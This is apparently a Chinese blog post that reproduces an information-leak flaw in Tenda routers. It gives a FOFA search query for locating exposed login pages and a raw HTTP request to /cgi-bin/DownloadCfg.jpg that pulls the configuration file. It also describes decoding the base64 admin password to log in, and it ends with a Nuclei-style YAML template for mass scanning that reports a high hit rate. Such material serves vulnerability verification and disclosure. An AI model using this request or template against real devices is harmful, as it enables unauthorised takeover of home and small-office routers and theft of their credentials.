# 原创
：  漏洞复现--Tenda路由器DownloadCfg信息泄露

# 漏洞复现--Tenda路由器DownloadCfg信息泄露

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担！**

### 一：漏洞描述

Tenda是一家专门提供网络设备和解决方案的公司，其中最知名的产品之一是路由器。Tenda路由器在家庭和小型办公室中非常受欢迎，因为它们提供了稳定的无线网络连接和易于设置的功能。该产品存在信息泄露漏洞，攻击者可获得路由器后台账号密码。

### 二:漏洞影响版本

Tenda-路由器

### 三：网络空间测绘查询

fofa:<br/> `title="Tenda | LOGIN"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/e44da381d276a278f31e68776569cadc.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/19c356b41913311edd582e439fc62e73.jpeg"/><br/> POC:

```
GET /cgi-bin/DownloadCfg.jpg HTTP/1.1
Host: x.x.x.x
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/52cfd19ad76bd61058e92d9006a92b9b.jpeg"/><br/> 密码base64解码<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/6be3b75b4edcf71064b161f7cafe4dd4.jpeg"/><br/> 成功登录

### 五：批量验证

```
id: Tenda-router-information-leaked

info:
  name: Tenda-router-information-leaked
  author: 芝士土拨鼠
  severity: medium
  description: Tenda是一家专门提供网络设备和解决方案的公司，其中最知名的产品之一是路由器。Tenda路由器在家庭和小型办公室中非常受欢迎，因为它们提供了稳定的无线网络连接和易于设置的功能。该产品存在信息泄露漏洞，攻击者可获得路由器后台账号密码。

requests:
  - raw:
      - |+
        GET /cgi-bin/DownloadCfg.jpg HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - sys
      - type: status
        status:
          - 200

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/3fec2975f0765f48a38c8dae9f402a6e.jpeg"/><br/> 十中九
